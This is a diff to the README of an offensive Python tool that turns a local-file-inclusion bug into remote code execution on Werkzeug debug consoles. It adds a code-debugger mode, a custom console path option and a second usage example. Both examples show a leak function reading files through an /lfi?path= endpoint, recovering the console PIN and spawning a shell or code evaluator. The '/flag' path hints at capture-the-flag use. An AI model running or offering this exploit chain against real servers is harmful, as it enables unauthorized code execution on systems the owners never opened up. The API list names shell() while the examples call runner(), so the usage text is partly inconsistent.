@@ -101,9 +101,12 @@ extractor.token                # Werkzeug console token (available in HTML sourc
 
 # Functions
 extractor.shell()              # Get interactive shell
+extractor.debugger()           # Get interactive code evaluator
 ```
 
-### Example
+### Examples
+
+#### Spawn a Shell
 
 ```py
 from wconsole_extractor import WConsoleExtractor, info
@@ -118,12 +121,35 @@ def leak_function(filename) -> str:
 
 extractor = WConsoleExtractor(
     target="http://localhost:5000",
-    leak_function=leak_function
+    leak_function=leak_function,
+    debugger_path="/flag", # Custom debugger path (default: /console)
 )
 
 
 info(f"PIN CODE: {extractor.pin_code}")
-extractor.shell()
+extractor.runner()
+```
+#### Spawn a Code Debugger
+```py
+from wconsole_extractor import WConsoleExtractor, info
+import requests
+
+def leak_function(filename) -> str:
+    r = requests.get(f"http://localhost:5000/lfi?path={filename}")
+    if r.status_code == 200:
+        return r.text
+    else:
+        return ""
+
+extractor = WConsoleExtractor(
+    target="http://localhost:5000",
+    leak_function=leak_function,
+    debugger_path="/flag", # Custom debugger path (default: /console)
+    spawn_shell = False    # Disable shell spawn and spawn a code debugger (default: True)
+)
+
+info(f"PIN CODE: {extractor.pin_code}")
+extractor.runner()
 ```
 
 ## Author
